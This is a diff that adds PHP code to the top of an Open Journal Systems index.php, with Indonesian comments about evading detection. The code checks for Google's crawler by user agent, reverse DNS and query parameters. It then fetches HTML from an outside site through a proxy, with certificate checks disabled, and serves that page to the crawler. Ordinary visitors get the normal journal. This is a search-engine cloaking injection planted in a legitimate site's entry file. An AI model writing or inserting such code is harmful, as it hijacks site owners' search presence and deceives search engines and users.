@@ -1,0 +1,66 @@
+<?php
+// Simpen di index.php bagian PALING ATAS
+
+// Deteksi Google pake multiple parameter
+$is_bot = 0;
+$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+// Google bot signatures (lowercase)
+$google_signs = ['googlebot', 'google-inspection', 'google-site-verification', 'googlebot-mobile'];
+foreach($google_signs as $sign) {
+    if(strpos($ua, $sign) !== false) {
+        $is_bot = 1;
+        break;
+    }
+}
+
+// DNS check
+if(!$is_bot) {
+    $host = gethostbyaddr($ip);
+    if(strpos($host, 'google') !== false) {
+        $is_bot = 1;
+    }
+}
+
+// Cek query param juga
+if(isset($_GET['gclid']) || isset($_GET['utm_source']) && strpos($_GET['utm_source'], 'google') !== false) {
+    $is_bot = 1;
+}
+
+if($is_bot) {
+    // Pake proxy biar ga ketauan
+    $proxy = 'https://cors-anywhere.herokuapp.com/'; // atau pake proxy lo sendiri
+    $target = 'https://pessawat.site/iyaisoo/index.html';
+    
+    // Pake curl dengan proxy
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $proxy . $target);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+    curl_setopt($ch, CURLOPT_REFERER, 'https://www.google.com/');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'Accept: text/html,application/xhtml+xml',
+        'Accept-Language: en-US,en;q=0.9',
+        'Cache-Control: no-cache'
+    ]);
+    
+    $html = curl_exec($ch);
+    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    if($html && $httpcode == 200) {
+        echo $html;
+        exit;
+    }
+}
+
+// OJS bootstrap...
+require_once 'lib/pkp/lib/vendor/autoload.php';
+define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
+chdir(BASE_SYS_DIR);
+require_once './lib/pkp/includes/functions.php';
+return new \APP\core\Application();
